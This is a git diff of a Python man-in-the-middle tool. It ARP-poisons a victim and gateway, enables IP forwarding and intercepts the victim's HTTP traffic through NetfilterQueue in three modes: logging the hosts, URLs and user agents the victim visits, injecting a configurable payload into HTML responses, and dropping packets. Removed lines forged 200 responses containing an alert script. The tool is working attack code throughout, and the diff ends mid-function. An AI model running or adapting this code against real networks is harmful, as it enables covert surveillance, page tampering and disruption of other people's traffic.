@@ -1,9 +1,27 @@
+#!/usr/bin/env python3
+"""
+New HTTP Interceptor with 3 Modes: MONITOR, TAMPER, DROP
+Similar to TCP interceptor but for HTTP traffic with proper gzip handling
+"""
+
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 import signal
 import sys
 import time
+import re
+import zlib
+import io
+import gzip
+import logging
+from datetime import datetime
+import subprocess
+import threading
+from colorama import Fore, Back, Style, init
+
+# Initialize colorama for colored output
+init(autoreset=True)
 
 # Import centralized configuration
 from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig
@@ -15,143 +33,530 @@ interface = NetworkConfig.INTERFACE
 victim_mac = AttackConfig.VICTIM_MAC
 gateway_mac = AttackConfig.GATEWAY_MAC
 
-# Get current injection payload
+# Get current HTTP attack mode and injection payload
+HTTP_ATTACK_MODE = AttackConfig.HTTP_ATTACK_MODE
 injection_code = AttackConfig.INJECTION_PAYLOADS.get(
     AttackConfig.CURRENT_PAYLOAD,
     AttackConfig.INJECTION_CODE
 )
 
-import re
-import zlib
-import io
-import gzip
-import logging
-from datetime import datetime
+# Use the original simple injection code instead of complex HTML blocks
+html_injection_block = injection_code
 
-# Setup detailed logging
+# Setup detailed logging with different levels for different modes
+log_level = logging.DEBUG if HTTP_ATTACK_MODE == "MONITOR" else logging.INFO
 logging.basicConfig(
-    level=logging.INFO,
+    level=log_level,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler(PathConfig.ATTACK_LOG),
+        logging.FileHandler(f'http_{HTTP_ATTACK_MODE.lower()}_attack.log'),
         logging.StreamHandler()
     ]
 )
 logger = logging.getLogger(__name__)
 
+class HTTPInterceptorStats:
+    """Comprehensive statistics tracking for HTTP interception"""
+    def __init__(self):
+        self.start_time = time.time()
+        
+        # Packet counters
+        self.total_packets = 0
+        self.http_requests = 0
+        self.http_responses = 0
+        self.https_packets = 0
+        self.non_http_packets = 0
+        
+        # Mode-specific counters
+        self.monitored_packets = 0
+        self.tampered_packets = 0
+        self.dropped_packets = 0
+        
+        # Content analysis
+        self.html_responses = 0
+        self.gzip_responses = 0
+        self.chunked_responses = 0
+        self.large_responses = 0  # > 10KB
+        
+        # Domains and URLs
+        self.domains_seen = set()
+        self.urls_intercepted = []
+        
+        # Errors
+        self.processing_errors = 0
+        self.gzip_errors = 0
+        self.injection_failures = 0
+    
+    def log_request(self, method, url, host, user_agent=None):
+        """Log HTTP request details"""
+        self.http_requests += 1
+        if host:
+            self.domains_seen.add(host)
+        self.urls_intercepted.append(f"{method} {url}")
+        
+        # Keep only last 50 URLs to avoid memory issues
+        if len(self.urls_intercepted) > 50:
+            self.urls_intercepted = self.urls_intercepted[-50:]
+    
+    def log_response(self, status_code, content_type, content_length, is_gzip=False, is_chunked=False):
+        """Log HTTP response details"""
+        self.http_responses += 1
+        
+        if 'text/html' in content_type.lower():
+            self.html_responses += 1
+        
+        if is_gzip:
+            self.gzip_responses += 1
+        
+        if is_chunked:
+            self.chunked_responses += 1
+        
+        try:
+            if content_length and int(content_length) > 10240:  # 10KB
+                self.large_responses += 1
+        except:
+            pass
+    
+    def print_stats(self):
+        """Print comprehensive statistics"""
+        runtime = time.time() - self.start_time
+        
+        print(f"\n{Fore.CYAN}{'='*70}")
+        print(f"📊 HTTP INTERCEPTOR STATISTICS - {HTTP_ATTACK_MODE} MODE")
+        print(f"{'='*70}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}⏱️  RUNTIME: {runtime:.1f} seconds{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.GREEN}📦 PACKET STATISTICS:{Style.RESET_ALL}")
+        print(f"   Total packets processed: {self.total_packets}")
+        print(f"   HTTP requests: {self.http_requests}")
+        print(f"   HTTP responses: {self.http_responses}")
+        print(f"   HTTPS packets (encrypted): {self.https_packets}")
+        print(f"   Non-HTTP packets: {self.non_http_packets}")
+        
+        print(f"\n{Fore.BLUE}🎯 MODE-SPECIFIC ACTIONS:{Style.RESET_ALL}")
+        if HTTP_ATTACK_MODE == "MONITOR":
+            print(f"   Packets monitored: {self.monitored_packets}")
+        elif HTTP_ATTACK_MODE == "TAMPER":
+            print(f"   Packets tampered: {self.tampered_packets}")
+            print(f"   Injection failures: {self.injection_failures}")
+        elif HTTP_ATTACK_MODE == "DROP":
+            print(f"   Packets dropped: {self.dropped_packets}")
+        
+        print(f"\n{Fore.MAGENTA}📄 CONTENT ANALYSIS:{Style.RESET_ALL}")
+        print(f"   HTML responses: {self.html_responses}")
+        print(f"   Gzip compressed: {self.gzip_responses}")
+        print(f"   Chunked encoding: {self.chunked_responses}")
+        print(f"   Large responses (>10KB): {self.large_responses}")
+        
+        if self.domains_seen:
+            print(f"\n{Fore.CYAN}🌐 DOMAINS INTERCEPTED ({len(self.domains_seen)}):{Style.RESET_ALL}")
+            for domain in sorted(self.domains_seen):
+                print(f"   • {domain}")
+        
+        if self.urls_intercepted:
+            print(f"\n{Fore.YELLOW}🔗 RECENT URLs (last 10):{Style.RESET_ALL}")
+            for url in self.urls_intercepted[-10:]:
+                print(f"   • {url}")
+        
+        if self.processing_errors > 0:
+            print(f"\n{Fore.RED}❌ ERRORS:{Style.RESET_ALL}")
+            print(f"   Processing errors: {self.processing_errors}")
+            print(f"   Gzip errors: {self.gzip_errors}")
+        
+        # Mode-specific recommendations
+        self.print_recommendations()
+    
+    def print_recommendations(self):
+        """Print mode-specific recommendations"""
+        print(f"\n{Fore.GREEN}💡 RECOMMENDATIONS:{Style.RESET_ALL}")
+        
+        if HTTP_ATTACK_MODE == "MONITOR":
+            if self.http_requests == 0:
+                print(f"   {Fore.YELLOW}• No HTTP requests detected - victim may not be browsing{Style.RESET_ALL}")
+                print(f"   {Fore.YELLOW}• Try browsing to http://neverssl.com from victim device{Style.RESET_ALL}")
+            else:
+                print(f"   {Fore.GREEN}• HTTP monitoring is working correctly{Style.RESET_ALL}")
+                print(f"   {Fore.GREEN}• Switch to TAMPER mode to modify traffic{Style.RESET_ALL}")
+        
+        elif HTTP_ATTACK_MODE == "TAMPER":
+            if self.tampered_packets == 0:
+                print(f"   {Fore.YELLOW}• No successful tampering - most traffic may be HTTPS{Style.RESET_ALL}")
+                print(f"   {Fore.YELLOW}• Try visiting HTTP-only sites for testing{Style.RESET_ALL}")
+            else:
+                print(f"   {Fore.GREEN}• HTTP tampering is working correctly{Style.RESET_ALL}")
+            
+            if self.gzip_errors > 0:
+                print(f"   {Fore.RED}• Gzip handling errors detected - may need improvements{Style.RESET_ALL}")
+        
+        elif HTTP_ATTACK_MODE == "DROP":
+            if self.dropped_packets > 0:
+                print(f"   {Fore.GREEN}• HTTP dropping is working - victim should have browsing issues{Style.RESET_ALL}")
+                print(f"   {Fore.YELLOW}• HTTPS traffic will still work (encrypted){Style.RESET_ALL}")
+            else:
+                print(f"   {Fore.YELLOW}• No HTTP packets dropped - victim may not be browsing HTTP sites{Style.RESET_ALL}")
+
+stats = HTTPInterceptorStats()
+
 def enable_ip_forwarding():
+    """Enable IP forwarding for MITM"""
     logger.info("[SETUP] Enabling IP forwarding")
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     
-    # Verify IP forwarding is enabled
     try:
         with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
             if f.read().strip() == '1':
                 logger.info("[SETUP] ✅ IP forwarding enabled successfully")
+                return True
             else:
                 logger.warning("[SETUP] ⚠️ IP forwarding may not be enabled")
+                return False
     except:
         logger.warning("[SETUP] Could not verify IP forwarding status")
+        return False
 
 def disable_ip_forwarding():
+    """Disable IP forwarding"""
     logger.info("[CLEANUP] Disabling IP forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 def poison(victim_ip, victim_mac, spoof_ip):
+    """Send ARP poison packet"""
     pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
     sendp(pkt, iface=interface, verbose=0)
-    logger.debug(f"[ARP-POISON] Sent to {victim_ip} ({victim_mac}): {spoof_ip} is at {get_if_hwaddr(interface)}")
 
 def restore(target_ip, target_mac, source_ip, source_mac):
+    """Restore ARP table"""
     logger.info(f"[ARP-RESTORE] Restoring {target_ip} -> {source_ip} mapping")
     pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                       psrc=source_ip, hwsrc=source_mac)
     sendp(pkt, count=5, iface=interface, verbose=0)
 
-def inject_at_top(html_bytes, injection_code):
-    """
-    Insert injection_code bytes immediately after the opening <body> tag if found,
-    otherwise at the very beginning of html_bytes.
-    """
-    pattern = re.compile(b"(<body[^>]*>)", re.IGNORECASE)
-    match = pattern.search(html_bytes)
-    if match:
-        insert_pos = match.end()
-        logger.info(f"[INJECTION] Found <body> tag at position {match.start()}-{match.end()}")
-        return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
+def extract_http_info(payload):
+    """Extract HTTP request/response information for monitoring"""
+    try:
+        text = payload.decode('utf-8', errors='ignore')
+        lines = text.split('\n')
+        
+        if not lines:
+            return None
+        
+        first_line = lines[0].strip()
+        headers = {}
+        
+        # Parse headers
+        for line in lines[1:]:
+            if ':' in line:
+                key, value = line.split(':', 1)
+                headers[key.strip().lower()] = value.strip()
+            elif line.strip() == '':
+                break  # End of headers
+        
+        return {
+            'first_line': first_line,
+            'headers': headers,
+            'host': headers.get('host', ''),
+            'user_agent': headers.get('user-agent', ''),
+            'content_type': headers.get('content-type', ''),
+            'content_length': headers.get('content-length', ''),
+            'content_encoding': headers.get('content-encoding', ''),
+            'transfer_encoding': headers.get('transfer-encoding', '')
+        }
+    except Exception as e:
+        logger.debug(f"[HTTP-PARSE] Error parsing HTTP info: {e}")
+        return None
+
+def monitor_http_packet(scapy_pkt, tcp_layer, payload):
+    """Monitor HTTP packet without modification (MONITOR mode)"""
+    stats.monitored_packets += 1
+    
+    src_ip = scapy_pkt.src
+    dst_ip = scapy_pkt.dst
+    src_port = tcp_layer.sport
+    dst_port = tcp_layer.dport
+    
+    # Determine packet direction
+    if src_ip == victim_ip:
+        direction = f"{Fore.BLUE}OUTGOING{Style.RESET_ALL}"
+        endpoint = f"{src_ip}:{src_port} → {dst_ip}:{dst_port}"
     else:
-        # No <body> tag found, insert at start
-        logger.warning(f"[INJECTION] No <body> tag found, prepending to content")
-        return injection_code + html_bytes
+        direction = f"{Fore.GREEN}INCOMING{Style.RESET_ALL}"
+        endpoint = f"{src_ip}:{src_port} → {dst_ip}:{dst_port}"
+    
+    # Check if it's an HTTP request
+    if payload.startswith(b"GET ") or payload.startswith(b"POST ") or \
+       payload.startswith(b"PUT ") or payload.startswith(b"DELETE ") or \
+       payload.startswith(b"HEAD ") or payload.startswith(b"OPTIONS "):
+        
+        http_info = extract_http_info(payload)
+        if http_info:
+            method = http_info['first_line'].split()[0]
+            url = http_info['first_line'].split()[1] if len(http_info['first_line'].split()) > 1 else "/"
+            host = http_info['host']
+            user_agent = http_info['user_agent']
+            
+            stats.log_request(method, url, host, user_agent)
+            
+            print(f"\n{Fore.CYAN}🌐 HTTP REQUEST [{direction}]{Style.RESET_ALL}")
+            print(f"   {Fore.WHITE}Endpoint: {endpoint}{Style.RESET_ALL}")
+            print(f"   {Fore.YELLOW}Request: {http_info['first_line']}{Style.RESET_ALL}")
+            if host:
+                print(f"   {Fore.GREEN}Host: {host}{Style.RESET_ALL}")
+            if user_agent:
+                print(f"   {Fore.MAGENTA}User-Agent: {user_agent[:50]}{'...' if len(user_agent) > 50 else ''}{Style.RESET_ALL}")
+            
+            logger.info(f"[HTTP-REQUEST] {direction.replace(Fore.BLUE, '').replace(Fore.GREEN, '').replace(Style.RESET_ALL, '')} {method} {url} - Host: {host}")
+    
+    # Check if it's an HTTP response
+    elif payload.startswith(b"HTTP/"):
+        http_info = extract_http_info(payload)
+        if http_info:
+            status_line = http_info['first_line']
+            content_type = http_info['content_type']
+            content_length = http_info['content_length']
+            content_encoding = http_info['content_encoding']
+            transfer_encoding = http_info['transfer_encoding']
+            
+            # Extract status code
+            status_code = status_line.split()[1] if len(status_line.split()) > 1 else "Unknown"
+            
+            stats.log_response(status_code, content_type, content_length, 
+                             content_encoding == 'gzip', transfer_encoding == 'chunked')
+            
+            # Color code status
+            if status_code.startswith('2'):
+                status_color = Fore.GREEN
+            elif status_code.startswith('3'):
+                status_color = Fore.YELLOW
+            elif status_code.startswith('4') or status_code.startswith('5'):
+                status_color = Fore.RED
+            else:
+                status_color = Fore.WHITE
+            
+            print(f"\n{Fore.CYAN}📄 HTTP RESPONSE [{direction}]{Style.RESET_ALL}")
+            print(f"   {Fore.WHITE}Endpoint: {endpoint}{Style.RESET_ALL}")
+            print(f"   {status_color}Status: {status_line}{Style.RESET_ALL}")
+            if content_type:
+                print(f"   {Fore.BLUE}Content-Type: {content_type}{Style.RESET_ALL}")
+            if content_length:
+                print(f"   {Fore.MAGENTA}Content-Length: {content_length} bytes{Style.RESET_ALL}")
+            if content_encoding:
+                print(f"   {Fore.CYAN}Content-Encoding: {content_encoding}{Style.RESET_ALL}")
+            if transfer_encoding:
+                print(f"   {Fore.YELLOW}Transfer-Encoding: {transfer_encoding}{Style.RESET_ALL}")
+            
+            # Show payload preview for small responses
+            if content_length and content_length.isdigit() and int(content_length) < 500:
+                try:
+                    headers_end = payload.find(b'\r\n\r\n')
+                    if headers_end != -1:
+                        body = payload[headers_end + 4:headers_end + 104]  # First 100 bytes
+                        body_text = body.decode('utf-8', errors='ignore')
+                        if body_text.strip():
+                            print(f"   {Fore.WHITE}Body Preview: {body_text[:50]}{'...' if len(body_text) > 50 else ''}{Style.RESET_ALL}")
+                except:
+                    pass
+            
+            logger.info(f"[HTTP-RESPONSE] {direction.replace(Fore.BLUE, '').replace(Fore.GREEN, '').replace(Style.RESET_ALL, '')} {status_line} - Type: {content_type}")
 
 def decode_chunked(data):
+    """Decode HTTP chunked transfer encoding"""
     decoded = b""
+    pos = 0
     chunk_count = 0
-    while data:
-        pos = data.find(b"\r\n")
-        if pos == -1:
-            break
-        try:
-            chunk_size = int(data[:pos], 16)
-        except ValueError:
-            break
-        chunk_count += 1
-        if chunk_size == 0:
-            break
-        data = data[pos+2:]
-        decoded += data[:chunk_size]
-        data = data[chunk_size+2:]  # skip \r\n after chunk
-    logger.info(f"[CHUNKED] Decoded {chunk_count} chunks, total size: {len(decoded)} bytes")
-    return decoded
+    
+    try:
+        while pos < len(data):
+            # Find the end of the chunk size line
+            end_pos = data.find(b"\r\n", pos)
+            if end_pos == -1:
+                break
+                
+            # Extract chunk size (in hex)
+            chunk_size_str = data[pos:end_pos].decode('ascii', errors='ignore')
+            try:
+                chunk_size = int(chunk_size_str, 16)
+            except ValueError:
+                logger.warning(f"[CHUNKED] Invalid chunk size: {chunk_size_str}")
+                break
+            
+            chunk_count += 1
+            
+            # If chunk size is 0, we're done
+            if chunk_size == 0:
+                break
+                
+            # Move past the chunk size line
+            pos = end_pos + 2
+            
+            # Extract the chunk data
+            if pos + chunk_size > len(data):
+                logger.warning(f"[CHUNKED] Chunk {chunk_count} extends beyond data")
+                break
+                
+            decoded += data[pos:pos + chunk_size]
+            pos += chunk_size + 2  # Skip the trailing \r\n
+            
+        logger.debug(f"[CHUNKED] Decoded {chunk_count} chunks, total size: {len(decoded)} bytes")
+        return decoded
+        
+    except Exception as e:
+        logger.warning(f"[CHUNKED] Error decoding chunked data: {e}")
+        return data  # Return original data if decoding fails
 
 def encode_chunked(data):
+    """Encode data using HTTP chunked transfer encoding"""
     chunks = []
     chunk_size = 1024
     chunk_count = 0
+    
     for i in range(0, len(data), chunk_size):
         chunk = data[i:i+chunk_size]
         chunks.append(b"%X\r\n" % len(chunk) + chunk + b"\r\n")
         chunk_count += 1
-    chunks.append(b"0\r\n\r\n")
-    logger.info(f"[CHUNKED] Encoded {chunk_count} chunks")
+        
+    chunks.append(b"0\r\n\r\n")  # End chunk
+    logger.debug(f"[CHUNKED] Encoded {chunk_count} chunks")
     return b"".join(chunks)
 
-def extract_request_info(payload):
-    """Extract HTTP request information for logging"""
+def inject_at_top(html_bytes, injection_code):
+    """Insert injection code at the top of HTML content"""
+    # Simple approach: try to inject after <body> tag, otherwise prepend
+    pattern = re.compile(b"(<body[^>]*>)", re.IGNORECASE)
+    match = pattern.search(html_bytes)
+    if match:
+        insert_pos = match.end()
+        logger.debug(f"[INJECTION] Found <body> tag, injecting after it")
+        return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
+    else:
+        # No <body> tag found, just prepend to content
+        logger.debug(f"[INJECTION] No <body> tag found, prepending injection")
+        return injection_code + html_bytes
+
+def tamper_http_packet(scapy_pkt, tcp_layer, payload):
+    """Tamper with HTTP packet by injecting content (TAMPER mode) - Simple version with extensive logging"""
+    
+    logger.info(f"[TAMPER-DEBUG] Starting tamper attempt on packet from {scapy_pkt.src}:{tcp_layer.sport} -> {scapy_pkt.dst}:{tcp_layer.dport}")
+    logger.info(f"[TAMPER-DEBUG] Payload size: {len(payload)} bytes")
+    logger.info(f"[TAMPER-DEBUG] Payload starts with: {payload[:50]}")
+    
+    # Check if this is an HTTP response
+    if not payload.startswith(b"HTTP/"):
+        logger.debug(f"[TAMPER-DEBUG] Not an HTTP response (doesn't start with HTTP/)")
+        return None
+    
+    logger.info(f"[TAMPER-DEBUG] ✅ Confirmed HTTP response")
+    
     try:
-        lines = payload.decode('utf-8', errors='ignore').split('\n')
-        if lines:
-            request_line = lines[0].strip()
-            host = None
-            user_agent = None
+        # Try to split headers and body
+        if b"\r\n\r\n" not in payload:
+            logger.warning(f"[TAMPER-DEBUG] No header/body separator found in payload")
+            return None
+        
+        header_raw, body = payload.split(b"\r\n\r\n", 1)
+        logger.info(f"[TAMPER-DEBUG] Split successful - Headers: {len(header_raw)} bytes, Body: {len(body)} bytes")
+        
+        # Decode headers
+        headers_text = header_raw.decode('utf-8', errors='ignore')
+        logger.info(f"[TAMPER-DEBUG] Headers decoded successfully")
+        
+        # Log the first few header lines for debugging
+        header_lines = headers_text.split('\r\n')
+        logger.info(f"[TAMPER-DEBUG] Status line: {header_lines[0] if header_lines else 'None'}")
+        
+        # Parse headers into dictionary
+        header_dict = {}
+        for line in header_lines[1:]:  # Skip status line
+            if ':' in line:
+                key, value = line.split(':', 1)
+                header_dict[key.strip().lower()] = value.strip().lower()
+        
+        logger.info(f"[TAMPER-DEBUG] Parsed {len(header_dict)} headers")
+        
+        # Get important headers
+        content_type = header_dict.get("content-type", "")
+        content_length = header_dict.get("content-length", "")
+        content_encoding = header_dict.get("content-encoding", "")
+        
+        logger.info(f"[TAMPER-DEBUG] Content-Type: '{content_type}'")
+        logger.info(f"[TAMPER-DEBUG] Content-Length: '{content_length}'")
+        logger.info(f"[TAMPER-DEBUG] Content-Encoding: '{content_encoding}'")
+        
+        # Check if it's HTML content
+        if 'text/html' not in content_type:
+            logger.info(f"[TAMPER-DEBUG] ❌ Not HTML content, skipping injection")
+            return None
+        
+        logger.info(f"[TAMPER-DEBUG] ✅ HTML content detected!")
+        
+        # Check for gzip encoding
+        if 'gzip' in content_encoding:
+            logger.info(f"[TAMPER-DEBUG] ❌ Gzip encoding detected, skipping to avoid fragmentation")
+            return None
+        
+        logger.info(f"[TAMPER-DEBUG] ✅ No gzip encoding, proceeding with injection")
+        
+        # Log body preview
+        body_preview = body[:200].decode('utf-8', errors='ignore')
+        logger.info(f"[TAMPER-DEBUG] Body preview (first 200 chars): {body_preview}")
+        
+        # Perform injection
+        logger.info(f"[TAMPER-DEBUG] Attempting injection with {len(html_injection_block)} bytes of payload")
+        injected_body = inject_at_top(body, html_injection_block)
+        
+        # Check injection result
+        size_increase = len(injected_body) - len(body)
+        logger.info(f"[TAMPER-DEBUG] Injection result: Original {len(body)} bytes -> {len(injected_body)} bytes (increase: {size_increase})")
+        
+        if size_increase <= 0:
+            logger.warning(f"[TAMPER-DEBUG] ❌ Injection failed - no size increase")
+            stats.injection_failures += 1
+            return None
+        
+        logger.info(f"[TAMPER-DEBUG] ✅ Injection successful!")
+        
+        # Update Content-Length header
+        if content_length:
+            new_length = str(len(injected_body))
+            logger.info(f"[TAMPER-DEBUG] Updating Content-Length: {content_length} -> {new_length}")
             
-            for line in lines[1:]:
-                if line.lower().startswith('host:'):
-                    host = line.split(':', 1)[1].strip()
-                elif line.lower().startswith('user-agent:'):
-                    user_agent = line.split(':', 1)[1].strip()
-            
-            return {
-                'request_line': request_line,
-                'host': host,
-                'user_agent': user_agent
-            }
-    except:
-        pass
-    return None
+            # Replace Content-Length in headers
+            headers_text = re.sub(
+                r"(?i)^(Content-Length:\s*)\d+",
+                f"Content-Length: {new_length}",
+                headers_text,
+                flags=re.MULTILINE
+            )
+            logger.info(f"[TAMPER-DEBUG] Content-Length header updated")
+        else:
+            logger.info(f"[TAMPER-DEBUG] No Content-Length header to update")
+        
+        # Rebuild the complete HTTP response
+        new_payload = headers_text.encode() + b"\r\n\r\n" + injected_body
+        logger.info(f"[TAMPER-DEBUG] Rebuilt payload: {len(new_payload)} bytes total")
+        
+        # Update statistics
+        stats.tampered_packets += 1
+        
+        logger.info(f"[TAMPER-DEBUG] ✅ Successfully created tampered packet!")
+        return new_payload
+        
+    except Exception as e:
+        logger.error(f"[TAMPER-DEBUG] ❌ Exception during tampering: {e}")
+        logger.error(f"[TAMPER-DEBUG] Exception type: {type(e).__name__}")
+        import traceback
+        logger.error(f"[TAMPER-DEBUG] Traceback: {traceback.format_exc()}")
+        stats.processing_errors += 1
+        return None
 
 def modify_packet(packet):
-    scapy_pkt = IP(packet.get_payload())
-    
-    # Log all intercepted packets first
-    src_ip = scapy_pkt.src
-    dst_ip = scapy_pkt.dst
-    
-    # Flag to track if we should process as HTML (defined at function level)
-    process_as_html = False
-    
-    if scapy_pkt.haslayer(TCP):
-        tcp_layer = scapy_pkt[TCP]
+    """Main packet modification function based on HTTP_ATTACK_MODE"""
+    try:
+        scapy_pkt = IP(packet.get_payload())
+        stats.total_packets += 1
+        
+        src_ip = scapy_pkt.src
+        dst_ip = scapy_pkt.dst
         
         # Check if this traffic involves our target victim
         is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
@@ -159,356 +564,122 @@ def modify_packet(packet):
         if not is_victim_traffic:
             packet.accept()
             return
-            
-        # Log all HTTP traffic involving victim
-        if tcp_layer.dport == 80 or tcp_layer.sport == 80:
-            logger.info(f"[HTTP-TRAFFIC] {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
-            
-            # Log return traffic specifically
-            if src_ip != victim_ip and dst_ip == victim_ip:
-                logger.warning(f"[RETURN-TRAFFIC] 🔄 HTTP Response detected: {src_ip}:{tcp_layer.sport} -> {dst_ip}")
-    
-    # Only check TCP packets with payload
-    if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
-        packet.accept()
-        return
-
-    tcp_layer = scapy_pkt[TCP]
-    payload = scapy_pkt[Raw].load
-
-    # Log HTTP requests and responses with enhanced detection
-    is_http_request = payload.startswith(b"GET ") or payload.startswith(b"POST ") or payload.startswith(b"PUT ") or payload.startswith(b"DELETE ")
-    is_http_response = payload.startswith(b"HTTP/")
-    
-    # Also check for responses that might be coming from web servers to victim
-    if not is_http_response and tcp_layer.sport == 80 and dst_ip == victim_ip:
-        # This might be an HTTP response that doesn't start with HTTP/ (fragmented packet)
-        logger.info(f"[HTTP-FRAGMENT] Possible HTTP response fragment from {src_ip}:80 -> {victim_ip}")
-        # Try to find HTTP headers in the payload
-        if b"Content-Type:" in payload or b"content-type:" in payload:
-            logger.warning(f"[HTTP-RESPONSE-ALT] 🔍 Detected HTTP response without HTTP/ start")
-            is_http_response = True
-    
-    if is_http_request or is_http_response:
-        if is_http_request:
-            # This is an HTTP request
-            request_info = extract_request_info(payload)
-            if request_info:
-                logger.info(f"[HTTP-REQUEST] {request_info['request_line']}")
-                if request_info['host']:
-                    logger.info(f"[HTTP-REQUEST] Host: {request_info['host']}")
-                if request_info['user_agent']:
-                    logger.info(f"[HTTP-REQUEST] User-Agent: {request_info['user_agent'][:50]}...")
         
-        # Check if this is an HTTP response
-        elif is_http_response:
-            logger.info(f"[HTTP-RESPONSE] ⭐ RESPONSE INTERCEPTED: {src_ip} -> {dst_ip}")
-            
-            # Log response status and headers
-            try:
-                # Handle different line ending formats
-                if b'\r\n' in payload:
-                    lines = payload.split(b'\r\n')
-                elif b'\n' in payload:
-                    lines = payload.split(b'\n')
-                else:
-                    lines = [payload]
-                
-                first_line = lines[0].decode('utf-8', errors='ignore').strip()
-                logger.info(f"[HTTP-RESPONSE] Status: {first_line}")
-                
-                # Log first few headers for debugging
-                for i, line in enumerate(lines[1:6]):  # Show first 5 headers
-                    if line:
-                        header_line = line.decode('utf-8', errors='ignore').strip()
-                        if header_line:  # Skip empty lines
-                            logger.info(f"[HTTP-HEADER] {header_line}")
-                
-                # Handle 304 Not Modified responses
-                if "304" in first_line and "Not Modified" in first_line:
-                    logger.warning(f"[HTTP-304] 🔄 Converting 304 Not Modified to 200 OK with injection")
-                    
-                    # Create a fake 200 response with injected content
-                    injected_html = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>Intercepted Page</title>
-    <style>
-        body {{ font-family: Arial, sans-serif; margin: 40px; }}
-        .injection {{ background: red; color: white; padding: 20px; border-radius: 10px; margin: 20px 0; }}
-        .warning {{ background: orange; color: black; padding: 15px; border-radius: 5px; }}
-    </style>
-</head>
-<body>
-    <div class="injection">
-        <h1>🚨 HTTP INJECTION SUCCESSFUL! 🚨</h1>
-        <p><strong>This page has been modified by ARP poisoning + MITM attack!</strong></p>
-        <p>Target Device: {dst_ip}</p>
-        <p>Original request was for: {request_info.get('host', 'unknown') if 'request_info' in locals() else 'unknown'}</p>
-        <p>Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
-    </div>
-    <div class="warning">
-        <h2>Technical Details:</h2>
-        <p>• ARP poisoning redirected traffic through attacker machine</p>
-        <p>• HTTP response intercepted and modified</p>
-        <p>• Original response was: 304 Not Modified (converted to 200 OK)</p>
-        <p>• Attack successful at {time.strftime('%H:%M:%S')}</p>
-    </div>
-    <script>
-        alert('🚨 SECURITY ALERT: This page has been compromised via ARP poisoning!');
-        console.log('HTTP injection successful - page modified by MITM attack');
-    </script>
-</body>
-</html>"""
-                    
-                    # Create new HTTP response
-                    new_response = f"HTTP/1.1 200 OK\r\n"
-                    new_response += f"Content-Type: text/html; charset=utf-8\r\n"
-                    new_response += f"Content-Length: {len(injected_html)}\r\n"
-                    new_response += f"Connection: close\r\n"
-                    new_response += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
-                    new_response += f"Pragma: no-cache\r\n"
-                    new_response += f"Expires: 0\r\n"
-                    new_response += f"\r\n{injected_html}"
-                    
-                    # Update packet with new response
-                    scapy_pkt[Raw].load = new_response.encode()
-                    
-                    # Recalculate packet lengths and checksums
-                    del scapy_pkt[IP].len
-                    del scapy_pkt[IP].chksum
-                    del scapy_pkt[TCP].chksum
-                    
-                    packet.set_payload(bytes(scapy_pkt))
-                    logger.warning(f"[HTTP-304] ✅ Successfully converted 304 to 200 with injection!")
-                    packet.accept()
-                    return
-                
-                # Handle 200 responses - be more flexible with status line matching
-                elif "200" in first_line:
-                    logger.info(f"[HTTP-200] Detected 200 response, checking for HTML content...")
-                    
-                    # Check if it's HTML content
-                    has_html_content = False
-                    content_type_found = None
-                    
-                    for line in lines:
-                        line_str = line.decode('utf-8', errors='ignore').lower()
-                        if line_str.startswith('content-type:'):
-                            content_type_found = line_str
-                            if 'text/html' in line_str:
-                                has_html_content = True
-                                break
-                    
-                    logger.info(f"[HTTP-200] Content-Type search result: {content_type_found}")
-                    logger.info(f"[HTTP-200] HTML content detected: {has_html_content}")
-                    
-                    if has_html_content:
-                        logger.warning(f"[HTTP-200] 🎯 Found 200 HTML response - processing for injection")
-                        process_as_html = True  # Set flag to process as HTML
-                    else:
-                        logger.info(f"[HTTP-200] 200 response but not HTML content - skipping injection")
-                        packet.accept()
-                        return
-                else:
-                    logger.info(f"[HTTP-OTHER] Non-injectable response: {first_line}")
-                    packet.accept()
-                    return
-                    
-            except Exception as e:
-                logger.error(f"[HTTP-RESPONSE] Error processing HTTP response: {e}")
-                # Show raw payload for debugging
-                payload_preview = payload[:200].decode('utf-8', errors='ignore')
-                logger.error(f"[HTTP-DEBUG] Payload preview: {payload_preview}")
+        # Check for HTTPS traffic (port 443) - log but don't process
+        if scapy_pkt.haslayer(TCP):
+            tcp_layer = scapy_pkt[TCP]
+            if tcp_layer.dport == 443 or tcp_layer.sport == 443:
+                stats.https_packets += 1
+                if stats.https_packets % 20 == 0:  # Log every 20th HTTPS packet
+                    logger.debug(f"[HTTPS] 🔒 HTTPS traffic: {src_ip}:{tcp_layer.sport} ↔ {dst_ip}:{tcp_layer.dport}")
                 packet.accept()
                 return
-            
-            # If we're processing as HTML, skip the old detection logic
-            if process_as_html:
-                pass  # Continue to HTML processing below
-            else:
-                packet.accept()
-                return
-    
-    # If we detected return traffic but no HTTP response, show debug info
-    elif tcp_layer.sport == 80 and dst_ip == victim_ip:
-        # No stream buffering, just accept and let modify_packet handle it
-        logger.info(f"[DEBUG-RESPONSE] Return traffic from {src_ip}:80 but no HTTP headers detected")
-        payload_preview = payload[:100].decode('utf-8', errors='ignore')
-        logger.info(f"[DEBUG-PAYLOAD] First 100 bytes: {repr(payload_preview)}")
-
-    # Process HTML responses (for 200 OK responses that passed validation above)
-    # For 200 responses, we've already validated HTML content above
-    # This section handles other HTTP responses or validates non-200 responses
-    if not process_as_html and not (b"HTTP/" in payload and (b"Content-Type: text/html" in payload or b"content-type: text/html" in payload)):
-        # Only log skip message for non-200 responses to avoid confusion
